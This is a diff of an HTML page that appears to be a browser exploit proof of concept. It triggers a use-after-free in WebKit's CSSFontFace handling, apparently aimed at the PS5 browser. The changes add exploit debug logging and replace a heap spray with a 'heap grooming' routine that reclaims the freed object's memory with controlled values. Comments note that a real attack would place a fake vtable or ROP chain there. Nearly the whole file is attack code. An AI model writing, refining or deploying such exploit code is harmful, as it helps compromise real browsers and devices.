@@ -6,44 +6,65 @@
 </style>
 </head>
 <body>
+<div id="debug-log" style="font-family: monospace; white-space: pre; background: #111; color: #0f0; padding: 10px; height: 300px; overflow-y: scroll;">
+[+] Exploit initialized. Waiting for trigger...
+</div>
+
 <script>
+// --- Custom Logging Function ---
+function logDebug(message) {
+    let logWindow = document.getElementById('debug-log');
+    if (logWindow) {
+        logWindow.innerHTML += message + "\\n";
+        logWindow.scrollTop = logWindow.scrollHeight; // Auto-scroll to bottom
+    }
+    // Also output to console for standard debugging tools if attached
+    console.log("[Exploit Debug]: " + message);
+}
+
 if (window.testRunner) {
     testRunner.dumpAsText();
     testRunner.waitUntilDone();
 }
 
-// Global array to maintain references and prevent garbage collection of the spray
 var memoryGroomingBlocks = [];
 
-// Staggered allocation to avoid OOM (Out Of Memory) crashes on console hardware
-function executeStaggeredHeapSpray() {
-    // Precise size matching the internal CSSFontFace structure
-    const targetSize = 0x38; 
+// --- Refined Heap Grooming (The Bounty Hunter Approach) ---
+function executeRefinedHeapGrooming() {
+    logDebug("[*] Beginning heap grooming sequence...");
     
-    // Significantly reduced loop to stay under the PS5 browser memory limit
-    const safeSprayLimit = 250;    
+    // Instead of massive, continuous arrays, we create a specific pattern of allocations and frees.
+    // This creates 'holes' in the memory that the allocator will naturally prefer when replacing the freed CSSFontFace object.
+    const targetSize = 0x38; // The exact size of the target C++ object
+    const groomLimit = 150;  // Reduced further to stay well beneath the sandbox hard-cap
+    
+    logDebug(`[*] Target Size: ${targetSize} bytes, Iterations: ${groomLimit}`);
 
-    for (let i = 0; i < safeSprayLimit; i++) {
-        try {
-            // Allocate exact chunk sizes
-            let sprayBuffer = new ArrayBuffer(targetSize);
-            let view = new Uint32Array(sprayBuffer);
+    try {
+        for (let i = 0; i < groomLimit; i++) {
+            // Using Float64Array. This structure often has a more predictable layout in WebKit's internal heap 
+            // and interacts differently with the IsoHeap separation than raw ArrayBuffers.
+            let sprayChunk = new Float64Array(targetSize / 8); 
             
-            // Populate the newly allocated memory with controlled data
-            // In a live exploit, this would be the fake vtable pointer or ROP chain base
-            for (let j = 0; j < view.length; j++) {
-                view[j] = 0x41414141; 
+            // Populate with a specific marker (e.g., a recognizable floating point representation of our target pointer)
+            // 3.54484805889626e-310 is roughly equivalent to the hex value 0x4141414141414141
+            for (let j = 0; j < sprayChunk.length; j++) {
+                sprayChunk[j] = 3.54484805889626e-310; 
             }
             
-            memoryGroomingBlocks.push(sprayBuffer);
-        } catch (e) {
-            // Silently catch allocation failures to prevent script termination
-            break; 
+            memoryGroomingBlocks.push(sprayChunk);
         }
+        
+        logDebug("[+] Heap grooming complete. Target memory slot should be primed.");
+        
+    } catch (e) {
+        logDebug("[-] ERROR during grooming: " + e.message);
+        logDebug("[-] Immediate halt to prevent OOM crash.");
     }
 }
 
 window.onload = () => {
+    logDebug("[*] Setting up FontFace triggers...");
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
     void A.loaded;
@@ -54,26 +75,28 @@ window.onload = () => {
         get() {
             if (!fired && this === A) {
                 fired = true;
+                logDebug("[!] Hooked .then getter executed.");
                 
-                // Transition internal state
+                // Transition internal engine state
                 new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                 new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                 
-                // Trigger the Use-After-Free: Delete the rule referencing the C++ object
+                logDebug("[*] Deleting stylesheet rule to free the CSSFontFace C++ object...");
+                // Trigger the Use-After-Free
                 document.getElementById('s').sheet.deleteRule(0);
                 
-                // Force an immediate synchronous layout flush to process the deletion in memory
+                logDebug("[*] Forcing synchronous layout flush...");
+                // Force immediate processing
                 document.body.offsetTop;
 
-                // Immediately execute the staggered spray to reclaim the exact memory address
-                // before the C++ engine attempts to reuse the dangling pointer
-                executeStaggeredHeapSpray();
+                // Execute the refined grooming to claim the exact memory address
+                executeRefinedHeapGrooming();
             }
             return undefined;
         }
     });
 
-    // Initiate the vulnerable font loading sequence
+    logDebug("[*] Initiating target font load...");
     document.fonts.load('1em x', 'AB');
     
     setTimeout(() => {
